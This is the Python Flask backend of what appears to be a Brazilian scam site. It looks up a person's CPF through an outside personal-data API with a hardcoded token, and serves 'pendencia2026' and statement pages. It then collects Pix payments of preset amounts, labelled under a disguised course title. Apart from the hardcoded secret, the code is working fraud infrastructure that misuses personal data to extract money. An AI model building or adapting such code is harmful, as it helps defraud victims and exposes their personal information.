from flask import Flask, render_template, jsonify, request
import requests
import os

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")


@app.after_request
def add_no_cache(response):
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response


API_TOKEN = "261207b9-0ec2-468a-ac04-f9d38a51da88"
API_BASE_URL = "https://api.amnesiatecnologia.rocks/"


@app.route('/extrato2')
def extrato2():
    return render_template('extrato2.html')


@app.route('/pendencia2026')
def pendencia2026():
    return render_template('pendencia2026.html')


@app.route('/conclusao')
def conclusao():
    return render_template('conclusao.html')


@app.route('/<cpf>')
def index(cpf):
    cpf_limpo = ''.join(filter(str.isdigit, cpf))
    return render_template('index.html', cpf=cpf_limpo)


@app.route('/api/consulta/<cpf>')
def consultar_cpf(cpf):
    cpf_limpo = ''.join(filter(str.isdigit, cpf))

    try:
        response = requests.get(
            API_BASE_URL,
            params={
                'token': API_TOKEN,
                'cpf': cpf_limpo
            },
            timeout=30
        )
        response.raise_for_status()
        return jsonify(response.json())
    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500


@app.route('/')
def home():
    fb_pixel = os.environ.get('FB_PIXEL_ID', '')
    ga_container = os.environ.get('GA_CONTAINER_ID', '')
    return render_template('sem_cpf.html', fb_pixel_id=fb_pixel, ga_container_id=ga_container)


@app.route('/checkout')
def checkout():
    nome = request.args.get('nome', '')
    cpf = request.args.get('cpf', '')
    valor = request.args.get('valor', '147.94')
    return render_template('checkout.html', nome=nome, cpf=cpf, valor=valor)


@app.route('/api/pix/create', methods=['POST'])
def create_pix():
    try:
        from gateway import create_pix

        data = request.get_json()
        nome = data.get('nome', 'Cliente')
        cpf = data.get('cpf', '')
        level = data.get('level', 1)
        valor = data.get('valor', 0)

        if valor:
            amount_cents = round(float(valor) * 100)
        elif level == 3:
            amount_cents = 3780
        elif level == 2:
            amount_cents = 6700
        else:
            amount_cents = 14794

        product_title = f"Curso do zero a {level}m"

        result = create_pix(
            customer_name=nome,
            customer_cpf=cpf,
            amount_cents=amount_cents,
            product_title=product_title,
        )

        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/pix/status/<transaction_id>')
def check_pix_status(transaction_id):
    try:
        from gateway import check_status
        result = check_status(transaction_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
